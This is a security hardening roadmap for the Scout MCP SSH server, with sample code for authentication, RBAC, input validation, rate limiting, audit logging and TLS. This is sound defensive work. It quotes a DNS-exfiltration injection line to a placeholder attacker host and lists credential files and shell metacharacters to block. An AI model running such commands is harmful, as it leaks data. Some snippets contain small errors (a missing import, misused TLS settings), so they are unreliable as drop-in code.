# Scout MCP Security Recommendations
**Research Date:** 2025-12-03
**Status:** Actionable Security Roadmap
**Priority:** High

## Executive Summary

This document provides comprehensive security recommendations for Scout MCP based on industry best practices for MCP servers, SSH-based remote access tools, and API security standards. The recommendations are organized by security domain with actionable implementation guidance.

**Current Security Posture:**
- ✅ SSH connection pooling with timeout management
- ✅ File size limits (1MB default)
- ✅ Shell command quoting via `repr()`
- ❌ No authentication on MCP endpoints
- ❌ No authorization controls (RBAC/path restrictions)
- ❌ Limited input validation (path traversal risk)
- ❌ No rate limiting
- ❌ No audit logging for compliance
- ❌ HTTP transport without TLS

---

## 1. Authentication

### Current State
- HTTP endpoint at `/mcp` has no authentication
- STDIO mode relies on process-level isolation
- Assumes trusted MCP client (dangerous assumption)

### Industry Standards (2025)

**MCP Specification Requirements:**
- MCP servers MUST NOT use sessions for authentication alone
- Must verify all inbound requests when authorization is implemented
- Token passthrough is explicitly forbidden (CVE-level risk)
- OAuth 2.1 is the recommended standard for MCP authorization

**Sources:**
- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices)
- [MCP OAuth 2.1 Specification](https://auth0.com/blog/mcp-specs-update-all-about-auth/)
- [InfraCloud MCP Security Guide](https://www.infracloud.io/blogs/securing-mcp-servers/)

### Recommended Implementation

#### Priority 1: Token-Based Authentication (OAuth 2.1)

```python
# scout_mcp/middleware/auth.py
from fastapi import HTTPException, Header
from typing import Optional
import jwt

async def verify_bearer_token(authorization: Optional[str] = Header(None)) -> dict:
    """
    Verify OAuth 2.1 Bearer token from Authorization header.

    Requirements:
    - Token must be issued FOR this MCP server (audience claim)
    - Token must include Resource Indicators (RFC 8707)
    - Short-lived tokens (15-60 min)
    - Rotate signing keys regularly
    """
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(401, headers={"WWW-Authenticate": "Bearer"})

    token = authorization.split(" ", 1)[1]

    try:
        # Verify token signature and claims
        payload = jwt.decode(
            token,
            key=get_public_key(),  # From JWKS endpoint
            algorithms=["RS256", "ES256"],  # No HS256
            audience=f"https://{SCOUT_SERVER_URL}",  # Resource indicator
            options={"verify_exp": True, "verify_iat": True}
        )

        # Validate scope for MCP operations
        required_scopes = {"mcp:read", "mcp:execute"}
        token_scopes = set(payload.get("scope", "").split())
        if not required_scopes.issubset(token_scopes):
            raise HTTPException(403, "Insufficient permissions")

        return payload

    except jwt.InvalidTokenError as e:
        raise HTTPException(401, f"Invalid token: {e}")
```

**Integration with FastMCP:**
```python
# scout_mcp/server.py
from fastmcp import FastMCP
from scout_mcp.middleware.auth import verify_bearer_token

mcp = FastMCP("scout_mcp")

# Add auth middleware to all MCP endpoints
@mcp.middleware("http")
async def authenticate_request(request, call_next):
    user = await verify_bearer_token(request.headers.get("authorization"))
    request.state.user = user
    return await call_next(request)
```

#### Priority 2: Mutual TLS (mTLS) for Service-to-Service

For deployments where Scout MCP is called by other services (not human users):

```python
# Environment configuration
SCOUT_MTLS_ENABLED=true
SCOUT_MTLS_CA_CERT=/path/to/ca.crt
SCOUT_MTLS_VERIFY_MODE=CERT_REQUIRED

# uvicorn SSL configuration
uvicorn.run(
    app,
    host=SCOUT_HTTP_HOST,
    port=SCOUT_HTTP_PORT,
    ssl_cert_reqs=ssl.CERT_REQUIRED,  # Require client certificate
    ssl_ca_certs=SCOUT_MTLS_CA_CERT,
    ssl_certfile=SCOUT_SERVER_CERT,
    ssl_keyfile=SCOUT_SERVER_KEY,
)
```

**Best Practice:** Combine mTLS (service identity) + OAuth tokens (user identity) for defense-in-depth.

**Sources:**
- [GitHub Blog: Secure Remote MCP Servers](https://github.blog/ai-and-ml/generative-ai/how-to-build-secure-and-scalable-remote-mcp-servers/)
- [GitGuardian TLS Authentication Guide](https://blog.gitguardian.com/a-complete-guide-to-transport-layer-security-tls-authentication/)

#### Priority 3: Multi-Factor Authentication (MFA)

For human-initiated sessions, require MFA during token issuance:

```python
# Identity provider configuration (Keycloak, Auth0, etc.)
{
  "mfa_required": true,
  "mfa_methods": ["totp", "webauthn"],  # TOTP or hardware keys
  "step_up_authentication": {
    "sensitive_operations": ["scout:write", "scout:execute"],
    "require_recent_auth": 300  # Re-auth for sensitive ops within 5 min
  }
}
```

**Sources:**
- [Stytch MCP Authentication Guide](https://stytch.com/blog/MCP-authentication-and-authorization-guide/)
- [Akto MCP Security Best Practices](https://www.akto.io/blog/mcp-security-best-practices)

---

## 2. Authorization

### Current State
- No role-based access control (RBAC)
- All authenticated users have full access to all hosts
- No path-based restrictions
- No command whitelisting

### Industry Standards

**OWASP API Security Top 10:**
- #1 Broken Object-Level Authorization (BOLA) - Most critical API risk
- #3 Broken Object Property-Level Authorization
- #4 Broken Function-Level Authorization

**SSH Proxy Patterns:**
- Teleport-style RBAC for SSH gateways
- HashiCorp Vault SSH with role-based policies
- Google IAP identity-based access control

**Sources:**
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [Teleport RBAC for SSH](https://goteleport.com/blog/rbac-with-openssh/)
- [HashiCorp Vault SSH](https://www.hashicorp.com/en/blog/managing-ssh-access-at-scale-with-hashicorp-vault)

### Recommended Implementation

#### Priority 1: Role-Based Access Control (RBAC)

```python
# scout_mcp/models/rbac.py
from dataclasses import dataclass
from typing import Set, Optional
from enum import Enum

class Permission(Enum):
    READ_FILE = "read_file"
    LIST_DIR = "list_dir"
    EXECUTE_CMD = "execute_cmd"
    TREE_DIR = "tree_dir"

@dataclass
class Role:
    name: str
    permissions: Set[Permission]
    allowed_hosts: Set[str]  # Host patterns (*, dev-*, prod-db-*)
    allowed_paths: Set[str]  # Path patterns (/var/log/*, /home/user/*)
    allowed_commands: Set[str]  # Command whitelist (grep, ls, cat)
    max_file_size: int = 1048576  # Per-role limits

# Predefined roles
ROLES = {
    "readonly": Role(
        name="readonly",
        permissions={Permission.READ_FILE, Permission.LIST_DIR},
        allowed_hosts={"*"},
        allowed_paths={"/var/log/*", "/etc/*.conf"},
        allowed_commands=set(),  # No command execution
        max_file_size=1048576,
    ),
    "developer": Role(
        name="developer",
        permissions={Permission.READ_FILE, Permission.LIST_DIR, Permission.EXECUTE_CMD},
        allowed_hosts={"dev-*", "staging-*"},
        allowed_paths={"/home/*", "/var/log/*", "/tmp/*"},
        allowed_commands={"grep", "ls", "cat", "tail", "head", "find", "tree"},
        max_file_size=10485760,  # 10MB
    ),
    "admin": Role(
        name="admin",
        permissions=set(Permission),
        allowed_hosts={"*"},
        allowed_paths={"/*"},
        allowed_commands={"*"},
        max_file_size=104857600,  # 100MB
    ),
}
```

```python
# scout_mcp/services/authorization.py
from fnmatch import fnmatch
from scout_mcp.models.rbac import Role, Permission

class AuthorizationService:
    """Enforce RBAC policies for Scout MCP operations."""

    def check_host_access(self, user_roles: list[str], hostname: str) -> bool:
        """Check if user's roles allow access to hostname."""
        for role_name in user_roles:
            role = ROLES.get(role_name)
            if role and any(fnmatch(hostname, pattern) for pattern in role.allowed_hosts):
                return True
        return False

    def check_path_access(self, user_roles: list[str], path: str) -> bool:
        """Check if user's roles allow access to path."""
        for role_name in user_roles:
            role = ROLES.get(role_name)
            if role and any(fnmatch(path, pattern) for pattern in role.allowed_paths):
                return True
        return False

    def check_command_access(self, user_roles: list[str], command: str) -> bool:
        """Check if user's roles allow command execution."""
        cmd_name = command.split()[0] if command else ""
        for role_name in user_roles:
            role = ROLES.get(role_name)
            if not role or Permission.EXECUTE_CMD not in role.permissions:
                continue
            if "*" in role.allowed_commands or cmd_name in role.allowed_commands:
                return True
        return False

    def get_max_file_size(self, user_roles: list[str]) -> int:
        """Get maximum allowed file size for user."""
        return max((ROLES[r].max_file_size for r in user_roles if r in ROLES), default=1048576)
```

#### Priority 2: Integration with Scout Tool

```python
# scout_mcp/tools/scout.py (updated)
from scout_mcp.services import get_authorization_service

@mcp.tool()
async def scout(
    target: str,
    command: str | None = None,
    tree: bool = False,
    user_context: dict = None,  # Injected by auth middleware
) -> str:
    """Scout tool with authorization checks."""
    auth_service = get_authorization_service()
    user_roles = user_context.get("roles", [])

    # Parse target
    parsed = parse_target(target)

    # Authorization checks
    if parsed.hostname:
        if not auth_service.check_host_access(user_roles, parsed.hostname):
            return f"Error: Access denied to host '{parsed.hostname}'"

        if parsed.path and not auth_service.check_path_access(user_roles, parsed.path):
            return f"Error: Access denied to path '{parsed.path}'"

        if command and not auth_service.check_command_access(user_roles, command):
            return f"Error: Command '{command}' not allowed"

    # Existing implementation continues...
```

#### Priority 3: Attribute-Based Access Control (ABAC)

For advanced use cases, extend RBAC with dynamic attributes:

```python
@dataclass
class AccessContext:
    """Dynamic context for ABAC decisions."""
    user_id: str
    roles: list[str]
    ip_address: str
    time_of_day: int  # Hour 0-23
    mfa_verified: bool
    risk_score: float  # 0.0-1.0 from behavior analysis

def check_access(context: AccessContext, resource: str, action: str) -> bool:
    """ABAC policy evaluation."""
    # Time-based restrictions
    if context.time_of_day < 6 or context.time_of_day > 22:
        if action == "EXECUTE_CMD" and "prod-" in resource:
            return False  # No prod command execution outside business hours

    # Risk-based step-up
    if context.risk_score > 0.7 and not context.mfa_verified:
        return False  # High-risk operations require recent MFA

    # Continue with RBAC checks...
```

**Sources:**
- [Microsoft Security: MCP Security Risks](https://techcommunity.microsoft.com/blog/microsoft-security-blog/understanding-and-mitigating-security-risks-in-mcp-implementations/4404667)
- [Ezeelogin SSH RBAC](https://www.ezeelogin.com/kb/article/role-based-access-control-in-ssh-552.html)

---

## 3. Input Validation

### Current State
- No path traversal prevention (relies on SSH server)
- Command quoting via `repr()` (weak against injection)
- File size limits (good)
- No command sanitization

### Security Risks

**Path Traversal (OWASP Top 10):**
- Attackers can access sensitive files: `/etc/passwd`, `~/.ssh/id_rsa`, `/root/.ssh/authorized_keys`
- Can read SSH private keys for privilege escalation
- Can modify `authorized_keys` for persistent access

**Command Injection (OWASP Top 10):**
- Shell metacharacters: `&`, `|`, `;`, `$()`, backticks
- Blind injection via DNS exfiltration: `nslookup $(whoami).attacker.com`
- Time-based detection: `ping -c 10 127.0.0.1`

**Sources:**
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)

### Recommended Implementation

#### Priority 1: Path Traversal Prevention

```python
# scout_mcp/utils/validation.py
import os
import re
from pathlib import Path
from typing import Optional

class PathValidator:
    """Secure path validation to prevent directory traversal."""

    # Deny patterns
    BLOCKED_PATTERNS = [
        r'\.\.',           # Parent directory
        r'~',              # Home directory expansion
        r'\$',             # Variable expansion
        r'`',              # Command substitution
        r'\x00',           # Null byte injection
        r'[\r\n]',         # CRLF injection
    ]

    # Sensitive paths (always block)
    SENSITIVE_PATHS = {
        '/etc/shadow', '/etc/passwd', '/etc/sudoers',
        '/root/.ssh/', '/home/*/.ssh/id_*',
        '/proc/self/environ', '/proc/self/cmdline',
    }

    @staticmethod
    def validate_path(path: str, allowed_base: Optional[str] = None) -> str:
        """
        Validate and canonicalize path.

        Args:
            path: User-supplied path
            allowed_base: Optional base directory constraint

        Returns:
            Canonicalized absolute path

        Raises:
            ValueError: If path is invalid or traverses outside allowed base
        """
        if not path:
            raise ValueError("Empty path")

        # Check for blocked patterns
        for pattern in PathValidator.BLOCKED_PATTERNS:
            if re.search(pattern, path):
                raise ValueError(f"Path contains blocked pattern: {pattern}")

        # Resolve to absolute path (removes .., symlinks)
        try:
            resolved = os.path.abspath(os.path.normpath(path))
        except Exception as e:
            raise ValueError(f"Invalid path: {e}")

        # Check against sensitive paths
        for sensitive in PathValidator.SENSITIVE_PATHS:
            if fnmatch(resolved, sensitive):
                raise ValueError(f"Access to sensitive path denied: {sensitive}")

        # Verify base directory constraint
        if allowed_base:
            base_resolved = os.path.abspath(allowed_base)
            if not resolved.startswith(base_resolved + os.sep):
                raise ValueError(f"Path traversal detected: {path} not in {allowed_base}")

        return resolved

    @staticmethod
    def validate_filename(filename: str) -> str:
        """Validate filename component (no directory separators)."""
        if '/' in filename or '\\' in filename:
            raise ValueError("Filename cannot contain directory separators")
        if filename in {'.', '..'}:
            raise ValueError("Invalid filename")
        return filename
```

```python
# scout_mcp/services/executors/cat.py (updated)
from scout_mcp.utils.validation import PathValidator

async def cat_file(conn: PooledConnection, path: str, max_size: int) -> CommandResult:
    """Read file with path validation."""
    try:
        # Validate path before execution
        validated_path = PathValidator.validate_path(path)
    except ValueError as e:
        return CommandResult(
            stdout="",
            stderr=f"Path validation failed: {e}",
            exit_code=1,
        )

    # Continue with existing implementation using validated_path...
```

#### Priority 2: Command Injection Prevention

```python
# scout_mcp/utils/validation.py
import shlex
from typing import List

class CommandValidator:
    """Secure command validation to prevent injection."""

    # Allowed commands (whitelist approach)
    SAFE_COMMANDS = {
        'cat', 'ls', 'grep', 'find', 'head', 'tail', 'wc',
        'tree', 'stat', 'file', 'du', 'df', 'ps', 'top',
    }

    # Shell metacharacters (always block)
    SHELL_METACHARACTERS = {
        '&', '|', ';', '$', '`', '\n', '\r',
        '(', ')', '<', '>', '{', '}', '[', ']',
    }

    @staticmethod
    def validate_command(command: str) -> List[str]:
        """
        Validate and parse command into safe argument list.

        Args:
            command: User-supplied command string

        Returns:
            List of command arguments (safe for execution)

        Raises:
            ValueError: If command is invalid or contains injection attempts
        """
        if not command:
            raise ValueError("Empty command")

        # Parse using shell-like syntax (handles quotes properly)
        try:
            args = shlex.split(command)
        except ValueError as e:
            raise ValueError(f"Invalid command syntax: {e}")

        if not args:
            raise ValueError("No command specified")

        # Verify command is whitelisted
        cmd_name = os.path.basename(args[0])
        if cmd_name not in CommandValidator.SAFE_COMMANDS:
            raise ValueError(f"Command not allowed: {cmd_name}")

        # Check each argument for shell metacharacters
        for arg in args:
            if any(char in arg for char in CommandValidator.SHELL_METACHARACTERS):
                raise ValueError(f"Argument contains shell metacharacter: {arg}")

        return args

    @staticmethod
    def escape_argument(arg: str) -> str:
        """
        Escape single argument for safe shell execution.

        Note: Prefer validate_command() with array execution.
        This is a fallback for legacy code.
        """
        return shlex.quote(arg)
```

```python
# scout_mcp/services/executors/command.py (updated)
from scout_mcp.utils.validation import CommandValidator

async def run_command(
    conn: PooledConnection,
    command: str,
    timeout: int,
) -> CommandResult:
    """Execute command with injection prevention."""
    try:
        # Validate and parse command
        args = CommandValidator.validate_command(command)
    except ValueError as e:
        return CommandResult(
            stdout="",
            stderr=f"Command validation failed: {e}",
            exit_code=1,
        )

    # Execute using argument array (NOT shell string)
    # This prevents shell interpretation of metacharacters
    async with conn.connection:
        result = await conn.connection.run(
            args,  # Pass as list, not string
            check=False,
            timeout=timeout,
        )

    return CommandResult(
        stdout=result.stdout,
        stderr=result.stderr,
        exit_code=result.exit_status,
    )
```

**Critical Rule:** NEVER call commands with shell=True or by concatenating strings.

**Sources:**
- [OWASP Input Validation](https://owasp.org/www-project-web-security-testing-guide/)
- [Contrast Security Path Traversal](https://www.contrastsecurity.com/security-influencers/september-attack-data-spotlight-on-path-traversal-one-of-the-gnarliest-application-attack-types-adr)

---

## 4. Rate Limiting

### Current State
- No rate limiting on any endpoint
- Vulnerable to DoS attacks
- No protection against brute-force or credential stuffing

### Industry Standards

**2025 Best Practices:**
- Apply rate limiting at API gateway AND application level (defense-in-depth)
- Differentiate limits for trusted vs. untrusted clients
- Stricter limits on sensitive endpoints (auth, execution)
- Dynamic adjustment based on real-time monitoring

**Sources:**
- [Zuplo API Rate Limiting Best Practices](https://zuplo.com/learning-center/10-best-practices-for-api-rate-limiting-in-2025)
- [Cloudflare Rate Limiting](https://developers.cloudflare.com/waf/rate-limiting-rules/best-practices/)

### Recommended Implementation

#### Priority 1: Token Bucket Algorithm

```python
# scout_mcp/middleware/rate_limit.py
from fastapi import HTTPException, Request
from collections import defaultdict
from dataclasses import dataclass
from datetime import datetime, timedelta
import asyncio

@dataclass
class TokenBucket:
    """Token bucket for rate limiting."""
    capacity: int
    refill_rate: float  # Tokens per second
    tokens: float
    last_refill: datetime

    def refill(self):
        """Refill tokens based on elapsed time."""
        now = datetime.utcnow()
        elapsed = (now - self.last_refill).total_seconds()
        self.tokens = min(self.capacity, self.tokens + elapsed * self.refill_rate)
        self.last_refill = now

    def consume(self, count: int = 1) -> bool:
        """Attempt to consume tokens."""
        self.refill()
        if self.tokens >= count:
            self.tokens -= count
            return True
        return False

class RateLimiter:
    """Rate limiter with per-endpoint and per-user limits."""

    # Global limits (per IP)
    GLOBAL_LIMITS = {
        "requests_per_second": 10,
        "requests_per_minute": 100,
        "requests_per_hour": 1000,
    }

    # Endpoint-specific limits
    ENDPOINT_LIMITS = {
        "/mcp/tools/scout": {"rps": 5, "burst": 10},
        "/health": {"rps": 100, "burst": 200},
    }

    def __init__(self):
        self.buckets: dict[str, TokenBucket] = {}
        self.lock = asyncio.Lock()

    async def check_limit(self, key: str, limit: dict) -> bool:
        """
        Check if request is within rate limit.

        Args:
            key: Rate limit key (e.g., "ip:1.2.3.4" or "user:alice")
            limit: {"rps": X, "burst": Y}

        Returns:
            True if allowed, False if rate limited
        """
        async with self.lock:
            bucket = self.buckets.get(key)
            if not bucket:
                bucket = TokenBucket(
                    capacity=limit["burst"],
                    refill_rate=limit["rps"],
                    tokens=limit["burst"],
                    last_refill=datetime.utcnow(),
                )
                self.buckets[key] = bucket

            return bucket.consume()

    async def cleanup_stale(self, max_age_seconds: int = 3600):
        """Remove stale buckets to prevent memory leak."""
        async with self.lock:
            cutoff = datetime.utcnow() - timedelta(seconds=max_age_seconds)
            self.buckets = {
                k: v for k, v in self.buckets.items()
                if v.last_refill > cutoff
            }

# Middleware integration
rate_limiter = RateLimiter()

@mcp.middleware("http")
async def apply_rate_limiting(request: Request, call_next):
    """Apply rate limiting to all requests."""
    # Identify client (prefer user ID, fallback to IP)
    user_id = getattr(request.state, "user", {}).get("sub")
    client_key = f"user:{user_id}" if user_id else f"ip:{request.client.host}"

    # Get endpoint-specific limit or use global
    endpoint = request.url.path
    limit = RateLimiter.ENDPOINT_LIMITS.get(endpoint, {"rps": 10, "burst": 20})

    # Check limit
    if not await rate_limiter.check_limit(client_key, limit):
        raise HTTPException(
            status_code=429,
            detail="Rate limit exceeded",
            headers={
                "Retry-After": "60",
                "X-RateLimit-Limit": str(limit["rps"]),
                "X-RateLimit-Remaining": "0",
            },
        )

    return await call_next(request)

# Background task to cleanup stale buckets
@mcp.on_startup
async def start_rate_limit_cleanup():
    """Start background task to cleanup stale rate limit buckets."""
    async def cleanup_loop():
        while True:
            await asyncio.sleep(3600)  # Every hour
            await rate_limiter.cleanup_stale()

    asyncio.create_task(cleanup_loop())
```

#### Priority 2: Adaptive Rate Limiting

For production deployments, implement adaptive limits based on behavior:

```python
@dataclass
class AdaptiveLimit:
    """Adaptive rate limit that adjusts based on behavior."""
    base_rps: float
    current_rps: float
    error_rate: float
    last_violation: datetime | None

    def adjust(self, success: bool):
        """Adjust limit based on request success."""
        if success:
            # Gradually increase limit (good behavior)
            self.current_rps = min(self.base_rps * 2, self.current_rps * 1.1)
        else:
            # Decrease limit on errors (possible attack)
            self.current_rps = max(self.base_rps * 0.1, self.current_rps * 0.5)
            self.last_violation = datetime.utcnow()
```

**Sources:**
- [API7 Rate Limiting Strategies](https://api7.ai/learning-center/api-101/rate-limiting-strategies-for-api-management)
- [TechTarget API Rate Limiting](https://www.techtarget.com/searchsecurity/feature/Implement-API-rate-limiting-to-reduce-attack-surfaces)

---

## 5. Audit Logging

### Current State
- Basic logging via `scout_mcp/middleware/logging.py`
- No structured audit trail
- No compliance-ready logging
- No user attribution in logs

### Compliance Requirements

**Regulated Industries (HIPAA, PCI-DSS, SOC 2, GDPR):**
- Who: User ID, IP address, authentication method
- What: Action performed, resource accessed, outcome
- When: Timestamp (UTC), session ID
- Where: Source IP, geographic location
- Why: Business context (optional)

**Retention:**
- HIPAA: 6 years
- PCI-DSS: 1 year (3 months online)
- GDPR: As needed for purpose, deletable on request
- SOC 2: 90-180 days minimum

**Protection:**
- Immutable logs (append-only, no deletion)
- Encrypted at rest and in transit
- Access restricted to security team
- Regular integrity checks

**Sources:**
- [BeyondTrust Remote Access Auditing](https://www.beyondtrust.com/blog/entry/monitor-log--audit-remote-support-activity)
- [Splashtop Compliance](https://www.splashtop.com/blog/compliance-in-remote-access)
- [Microsoft Audit Logging](https://learn.microsoft.com/en-us/compliance/assurance/assurance-audit-logging)

### Recommended Implementation

#### Priority 1: Structured Audit Logging

```python
# scout_mcp/services/audit.py
import structlog
from datetime import datetime
from typing import Any, Optional
from enum import Enum

class AuditEvent(Enum):
    """Audit event types."""
    AUTH_SUCCESS = "auth.success"
    AUTH_FAILURE = "auth.failure"
    FILE_READ = "file.read"
    DIRECTORY_LIST = "directory.list"
    COMMAND_EXECUTE = "command.execute"
    ACCESS_DENIED = "access.denied"
    RATE_LIMIT = "rate_limit.exceeded"
    ERROR = "error"

@dataclass
class AuditEntry:
    """Structured audit log entry."""
    timestamp: datetime
    event_type: AuditEvent
    user_id: str
    user_roles: list[str]
    ip_address: str
    session_id: str
    resource: str
    action: str
    outcome: str  # "success", "failure", "denied"
    details: dict[str, Any]
    risk_score: float | None = None

class AuditLogger:
    """Compliance-ready audit logger."""

    def __init__(self):
        self.logger = structlog.get_logger("audit")

    def log_event(self, entry: AuditEntry):
        """Log audit event in structured format."""
        self.logger.info(
            "audit_event",
            timestamp=entry.timestamp.isoformat(),
            event_type=entry.event_type.value,
            user_id=entry.user_id,
            user_roles=entry.user_roles,
            ip_address=entry.ip_address,
            session_id=entry.session_id,
            resource=entry.resource,
            action=entry.action,
            outcome=entry.outcome,
            details=entry.details,
            risk_score=entry.risk_score,
        )

    def log_file_access(
        self,
        user_id: str,
        ip: str,
        hostname: str,
        path: str,
        operation: str,
        success: bool,
        **kwargs,
    ):
        """Log file access event."""
        entry = AuditEntry(
            timestamp=datetime.utcnow(),
            event_type=AuditEvent.FILE_READ if operation == "read" else AuditEvent.DIRECTORY_LIST,
            user_id=user_id,
            user_roles=kwargs.get("roles", []),
            ip_address=ip,
            session_id=kwargs.get("session_id", ""),
            resource=f"{hostname}:{path}",
            action=operation,
            outcome="success" if success else "failure",
            details=kwargs.get("details", {}),
        )
        self.log_event(entry)

    def log_command_execution(
        self,
        user_id: str,
        ip: str,
        hostname: str,
        command: str,
        exit_code: int,
        **kwargs,
    ):
        """Log command execution event."""
        entry = AuditEntry(
            timestamp=datetime.utcnow(),
            event_type=AuditEvent.COMMAND_EXECUTE,
            user_id=user_id,
            user_roles=kwargs.get("roles", []),
            ip_address=ip,
            session_id=kwargs.get("session_id", ""),
            resource=hostname,
            action=f"execute: {command[:100]}",  # Truncate long commands
            outcome="success" if exit_code == 0 else "failure",
            details={
                "command": command,
                "exit_code": exit_code,
                "duration_ms": kwargs.get("duration_ms"),
            },
        )
        self.log_event(entry)

    def log_access_denied(
        self,
        user_id: str,
        ip: str,
        resource: str,
        reason: str,
        **kwargs,
    ):
        """Log access denial event."""
        entry = AuditEntry(
            timestamp=datetime.utcnow(),
            event_type=AuditEvent.ACCESS_DENIED,
            user_id=user_id,
            user_roles=kwargs.get("roles", []),
            ip_address=ip,
            session_id=kwargs.get("session_id", ""),
            resource=resource,
            action="access",
            outcome="denied",
            details={"reason": reason},
            risk_score=kwargs.get("risk_score"),
        )
        self.log_event(entry)

# Global instance
audit_logger = AuditLogger()
```

#### Priority 2: Integration with Scout Tool

```python
# scout_mcp/tools/scout.py (updated)
from scout_mcp.services.audit import audit_logger

@mcp.tool()
async def scout(
    target: str,
    command: str | None = None,
    tree: bool = False,
    user_context: dict = None,
    request_context: dict = None,
) -> str:
    """Scout tool with audit logging."""
    start_time = datetime.utcnow()

    parsed = parse_target(target)

    try:
        # Authorization checks (as before)...

        # Execute operation
        if command:
            result = await run_command(conn, command, timeout)

            # Audit log
            audit_logger.log_command_execution(
                user_id=user_context["sub"],
                ip=request_context["ip"],
                hostname=parsed.hostname,
                command=command,
                exit_code=result.exit_code,
                roles=user_context["roles"],
                session_id=request_context["session_id"],
                duration_ms=(datetime.utcnow() - start_time).total_seconds() * 1000,
            )
        else:
            result = await cat_file(conn, parsed.path, max_size)

            # Audit log
            audit_logger.log_file_access(
                user_id=user_context["sub"],
                ip=request_context["ip"],
                hostname=parsed.hostname,
                path=parsed.path,
                operation="read",
                success=result.exit_code == 0,
                roles=user_context["roles"],
                session_id=request_context["session_id"],
            )

        return result.stdout if result.exit_code == 0 else result.stderr

    except AuthorizationError as e:
        # Audit denial
        audit_logger.log_access_denied(
            user_id=user_context["sub"],
            ip=request_context["ip"],
            resource=target,
            reason=str(e),
            roles=user_context["roles"],
        )
        return f"Error: {e}"
```

#### Priority 3: Log Storage and Rotation

```python
# scout_mcp/config.py (updated)
SCOUT_AUDIT_LOG_PATH = os.getenv("SCOUT_AUDIT_LOG_PATH", "/var/log/scout_mcp/audit.jsonl")
SCOUT_AUDIT_LOG_RETENTION_DAYS = int(os.getenv("SCOUT_AUDIT_LOG_RETENTION_DAYS", "365"))
SCOUT_AUDIT_LOG_MAX_SIZE_MB = int(os.getenv("SCOUT_AUDIT_LOG_MAX_SIZE_MB", "100"))

# Logging configuration
import logging.handlers

audit_handler = logging.handlers.RotatingFileHandler(
    SCOUT_AUDIT_LOG_PATH,
    maxBytes=SCOUT_AUDIT_LOG_MAX_SIZE_MB * 1024 * 1024,
    backupCount=10,  # Keep 10 rotated files
)
audit_handler.setFormatter(logging.Formatter("%(message)s"))  # JSON lines
```

**Production Recommendation:** Ship audit logs to immutable storage (S3, Syslog, SIEM) for compliance.

**Sources:**
- [CISA Remote Access Guide](https://www.cisa.gov/sites/default/files/2023-06/Guide%20to%20Securing%20Remote%20Access%20Software_clean%20Final_508c.pdf)
- [RSI Security Remote Auditing](https://blog.rsisecurity.com/comprehensive-guide-to-remote-auditing/)

---

## 6. Network Security

### Current State
- HTTP transport without TLS by default
- Binds to 0.0.0.0 (all interfaces)
- No VPN integration
- No firewall configuration guidance

### Industry Standards

**TLS Requirements (2025):**
- TLS 1.3 preferred, TLS 1.2 minimum
- Strong cipher suites only (AES-GCM, ChaCha20)
- No CBC, RC4, or weak ciphers
- Perfect Forward Secrecy (PFS)
- Certificate management automation

**Network Segmentation:**
- SSH bastion host pattern
- VPN overlay networks (WireGuard, Tailscale)
- Zero Trust Network Access (ZTNA)
- Firewall rules for defense-in-depth

**Sources:**
- [AWS API Gateway TLS Policies](https://aws.amazon.com/blogs/compute/enhancing-api-security-with-amazon-api-gateway-tls-security-policies/)
- [Teleport SSH Bastion Security](https://goteleport.com/blog/security-hardening-ssh-bastion-best-practices/)

### Recommended Implementation

#### Priority 1: TLS 1.3 Configuration

```python
# scout_mcp/__main__.py (updated)
import ssl
from pathlib import Path

def create_ssl_context() -> ssl.SSLContext:
    """Create hardened TLS 1.3 SSL context."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

    # Require TLS 1.3 only (or 1.2 minimum)
    context.minimum_version = ssl.TLSVersion.TLSv1_3
    context.maximum_version = ssl.TLSVersion.TLSv1_3

    # Load server certificate and private key
    cert_path = os.getenv("SCOUT_TLS_CERT", "/etc/scout_mcp/server.crt")
    key_path = os.getenv("SCOUT_TLS_KEY", "/etc/scout_mcp/server.key")
    context.load_cert_chain(cert_path, key_path)

    # Recommended TLS 1.3 cipher suites
    context.set_ciphers(":".join([
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_128_GCM_SHA256",
    ]))

    # Enable Perfect Forward Secrecy
    context.options |= ssl.OP_NO_COMPRESSION
    context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE

    # Optional: Client certificate authentication (mTLS)
    if os.getenv("SCOUT_MTLS_ENABLED", "false").lower() == "true":
        context.verify_mode = ssl.CERT_REQUIRED
        ca_cert = os.getenv("SCOUT_MTLS_CA_CERT", "/etc/scout_mcp/ca.crt")
        context.load_verify_locations(ca_cert)

    return context

def run_server():
    """Run Scout MCP server with TLS."""
    if SCOUT_TRANSPORT == "http":
        ssl_context = None
        if os.getenv("SCOUT_TLS_ENABLED", "true").lower() == "true":
            ssl_context = create_ssl_context()

        uvicorn.run(
            mcp.app,
            host=SCOUT_HTTP_HOST,
            port=SCOUT_HTTP_PORT,
            ssl_context=ssl_context,  # HTTPS when enabled
        )
    else:
        # STDIO mode
        mcp.run()
```

**Environment Configuration:**
```bash
# TLS/HTTPS
SCOUT_TLS_ENABLED=true
SCOUT_TLS_CERT=/etc/scout_mcp/certs/server.crt
SCOUT_TLS_KEY=/etc/scout_mcp/certs/server.key

# mTLS (optional)
SCOUT_MTLS_ENABLED=true
SCOUT_MTLS_CA_CERT=/etc/scout_mcp/certs/ca.crt

# Network binding
SCOUT_HTTP_HOST=127.0.0.1  # Localhost only (use reverse proxy)
SCOUT_HTTP_PORT=8443       # HTTPS port
```

#### Priority 2: Certificate Management Automation

```python
# scripts/renew-certs.py
"""
Automatic certificate renewal with Let's Encrypt.

Usage:
    python scripts/renew-certs.py --domain scout.example.com
"""
import subprocess
from pathlib import Path

def renew_certificate(domain: str, cert_dir: Path):
    """Renew certificate using certbot."""
    subprocess.run([
        "certbot", "certonly",
        "--standalone",
        "--domain", domain,
        "--cert-path", str(cert_dir / "server.crt"),
        "--key-path", str(cert_dir / "server.key"),
        "--non-interactive",
        "--agree-tos",
    ], check=True)

# Cron job: 0 0 * * 0 python /opt/scout_mcp/scripts/renew-certs.py
```

**Production:** Use cert-manager (Kubernetes) or AWS ACM for automated certificate lifecycle.

#### Priority 3: Network Segmentation

**Bastion Host Pattern:**
```yaml
# docker-compose.yaml
version: "3.8"

services:
  scout_mcp:
    image: scout_mcp:latest
    networks:
      - internal  # Not exposed to public
    environment:
      SCOUT_HTTP_HOST: 0.0.0.0
